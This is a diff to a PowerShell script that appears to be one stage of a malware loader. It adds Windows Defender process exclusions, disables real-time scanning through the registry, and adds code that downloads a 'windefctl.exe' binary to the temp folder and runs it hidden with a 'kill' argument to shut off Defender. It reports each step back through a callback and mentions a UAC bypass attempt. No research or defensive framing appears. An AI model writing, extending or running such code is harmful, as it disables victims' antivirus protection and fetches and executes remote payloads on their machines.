@@ -115,6 +115,7 @@ if($cbIsAdmin){
         & $mp -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue | Out-Null
         & $mp -ExclusionProcess 'msupdate.exe' -ErrorAction SilentlyContinue | Out-Null
         & $mp -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue | Out-Null
+        & $mp -ExclusionProcess 'windefctl.exe' -ErrorAction SilentlyContinue | Out-Null
     }catch{}
 
     try{
@@ -130,11 +131,33 @@ if($cbIsAdmin){
         Set-ItemProperty -Path $rtp -Name 'DisableScanOnRealtimeEnable' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
         _log "S2: reg ok"
     }catch{}
+}
 
-    _runWait 'windefctl.exe' 'kill' 'S2' 'defkill' 18 | Out-Null
-    _cb 'S2' 'ok' 'defender killed'
+# download windefctl regardless of admin (for logging/diagnosis and UAC attempt)
+$wdcBytes=_dl 'windefctl.exe'
+$wdcPath="$env:TEMP\windefctl.exe"
+if($wdcBytes){
+    [IO.File]::WriteAllBytes($wdcPath,$wdcBytes)|Out-Null
+    _log "S2: windefctl written $($wdcBytes.Length)"
+    if($cbIsAdmin){
+        try{
+            $proc=Start-Process $wdcPath -ArgumentList 'kill' -WindowStyle Hidden -PassThru
+            _log "S2: defkill started, pid=$($proc.Id), waiting 18s"
+            Start-Sleep 18
+            if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
+            _log "S2: defkill done"
+            _cb 'S2' 'ok' 'defender killed'
+        }catch{
+            _log "S2: defkill err: $($_.Exception.Message)"
+            _cb 'S2' 'fail' 'defkill err'
+        }
+    }else{
+        _log 'S2: no admin, skipping defkill exec'
+        _cb 'S2' 'skip' 'no admin'
+    }
 }else{
-    _cb 'S2' 'skip' 'no admin'
+    _log 'S2: windefctl dl fail'
+    _cb 'S2' 'fail' 'windefctl dl fail'
 }
 
 # cleanup windefctl binary
